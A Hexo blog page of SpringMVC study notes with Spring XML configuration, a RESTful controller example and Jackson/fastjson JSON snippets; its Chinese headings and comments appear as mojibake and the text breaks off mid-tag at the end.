<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"classpath:spring-service.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"classpath:spring-dao.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"classpath:spring-mvc.xml"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    DispatcherServlet--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    ä¹±ç è¿‡æ»¤--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    session--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>12<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/10/17/SpringMVCå­¦ä¹ æ€»ç»“/">
      SpringMVCå­¦ä¹ æ€»ç»“
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-10-17</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h1 id="SprngMVCå­¦ä¹ æ€»ç»“"><a href="#SprngMVCå­¦ä¹ æ€»ç»“" class="headerlink" title="SprngMVCå­¦ä¹ æ€»ç»“"></a>SprngMVCå­¦ä¹ æ€»ç»“</h1><h2 id="HelloSpringMvcé‡åˆ°çš„é—®é¢˜"><a href="#HelloSpringMvcé‡åˆ°çš„é—®é¢˜" class="headerlink" title="HelloSpringMvcé‡åˆ°çš„é—®é¢˜"></a>HelloSpringMvcé‡åˆ°çš„é—®é¢˜</h2><ul>
<li>Tomcatä¸­æ²¡æœ‰ç›¸åº”çš„jaråŒ…,éœ€è¦å¯¼å…¥!</li>
<li>controlleråœ¨æ³¨å†Œæ—¶çš„id,å°±æ˜¯urlä¸­çš„å‚æ•°,éœ€è¦ä¿æŒä¸€è‡´</li>
</ul>
<h2 id="ä½¿ç”¨æ³¨è§£è¿›è¡Œå¼€å‘"><a href="#ä½¿ç”¨æ³¨è§£è¿›è¡Œå¼€å‘" class="headerlink" title="ä½¿ç”¨æ³¨è§£è¿›è¡Œå¼€å‘"></a>ä½¿ç”¨æ³¨è§£è¿›è¡Œå¼€å‘</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    è‡ªåŠ¨æ‰«æåŒ…ï¼Œè®©æŒ‡å®šåŒ…ä¸‹çš„æ³¨è§£ç”Ÿæ•ˆ--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.controller"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    è®©SpringMVCä¸å¤„ç†é™æ€èµ„æº--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    è‡ªåŠ¨æ³¨å…¥--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="RestFullé£æ ¼"><a href="#RestFullé£æ ¼" class="headerlink" title="RestFullé£æ ¼"></a>RestFullé£æ ¼</h2><h3 id="urlè·¯å¾„ä¸­å‚æ•°çš„æºå¸¦"><a href="#urlè·¯å¾„ä¸­å‚æ•°çš„æºå¸¦" class="headerlink" title="urlè·¯å¾„ä¸­å‚æ•°çš„æºå¸¦"></a>urlè·¯å¾„ä¸­å‚æ•°çš„æºå¸¦</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/add/&#123;a&#125;/&#123;b&#125;"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">(@PathVariable <span class="keyword">int</span> a,@PathVariable <span class="keyword">int</span> b, Model model)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = a+b;</span><br><span class="line">    model.addAttribute(<span class="string">"msg"</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="JSONçš„ä½¿ç”¨"><a href="#JSONçš„ä½¿ç”¨" class="headerlink" title="JSONçš„ä½¿ç”¨"></a>JSONçš„ä½¿ç”¨</h2><h3 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h3><ul>
<li><p>ä¾èµ–(éœ€è¦å°†å…¶jaråŒ…å¯¼å…¥tomcatçš„ä¾èµ–)</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨(å¯ä»¥åœ¨å¤§ç¯å¢ƒä¸‹ä½¿ç”¨@RestController)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/json"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">json</span><span class="params">()</span> <span class="keyword">throws</span> JsonProcessingException </span>&#123;</span><br><span class="line">    ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">    Date date = <span class="keyword">new</span> Date();</span><br><span class="line">    String str = objectMapper.writeValueAsString(date);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><ul>
<li><p>ä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.73<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/fastJson"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">fastJson</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        fastJson æœ‰å¾ˆå¤šåŠŸèƒ½å…¶å®éƒ½å¯ä»¥ç”¨jacksonæ‰©å±•å†™</span></span><br><span class="line"><span class="comment">//        javaå¯¹è±¡è½¬JSONå­—ç¬¦ä¸²JSON.toJSONString</span></span><br><span class="line"><span class="comment">//        JSONå­—ç¬¦ä¸²è½¬JAVAå¯¹è±¡JSON.parseObject()</span></span><br><span class="line"></span><br><span class="line">        Date date = <span class="keyword">new</span> Date();</span><br><span class="line">        String json = JSON.toJSONString(date);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="ä¹±ç é—®é¢˜"><a href="#ä¹±ç é—®é¢˜" class="headerlink" title="ä¹±ç é—®é¢˜"></a>ä¹±ç é—®é¢˜</h2><h3 id="Webä¸­çš„ä¹±ç "><a href="#Webä¸­çš„ä¹±ç " class="headerlink" title="Webä¸­çš„ä¹±ç "></a>Webä¸­çš„ä¹±ç </h3><ul>
<li>åœ¨web.xmlä¸­è¿›è¡Œé…ç½®</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Jacksonä¸­çš„ä¹±ç "><a href="#Jacksonä¸­çš„ä¹±ç " class="headerlink" title="Jacksonä¸­çš„ä¹±ç "></a>Jacksonä¸­çš„ä¹±ç </h3><ul>
<li>åœ¨springMVCçš„é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    è‡ªåŠ¨æ³¨å…¥,JSONä¹±ç é—®é¢˜é…ç½®--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.xml.SourceHttpMessageConverter"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.cbor.MappingJackson2CborHttpMessageConverter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"objectMapper"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"failOnEmptyBeans"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="fastjsonä¸­çš„ä¹±ç "><a href="#fastjsonä¸­çš„ä¹±ç " class="headerlink" title="fastjsonä¸­çš„ä¹±ç "></a>fastjsonä¸­çš„ä¹±ç </h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.StringHttpMessageConverter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"supportedMediaTypes"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>application/json;charset=UTF-8<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="springMVCä¸­çš„å…¨éƒ¨é…ç½®æ–‡ä»¶"><a href="#springMVCä¸­çš„å…¨éƒ¨é…ç½®æ–‡ä»¶" class="headerlink" title="springMVCä¸­çš„å…¨éƒ¨é…ç½®æ–‡ä»¶"></a>springMVCä¸­çš„å…¨éƒ¨é…ç½®æ–‡ä»¶</h2><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Springmvc-servlet-xml"><a href="#Springmvc-servlet-xml" class="headerlink" title="Springmvc-servlet.xml"></a>Springmvc-servlet.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    è‡ªåŠ¨æ‰«æåŒ…ï¼Œè®©æŒ‡å®šåŒ…ä¸‹çš„æ³¨è§£ç”Ÿæ•ˆ--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.controller"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    è®©SpringMVCä¸å¤„ç†é™æ€èµ„æº--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    è‡ªåŠ¨æ³¨å…¥,JSONä¹±ç é—®é¢˜é…ç½®--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.xml.SourceHttpMessageConverter"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.cbor.MappingJackson2CborHttpMessageConverter"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span 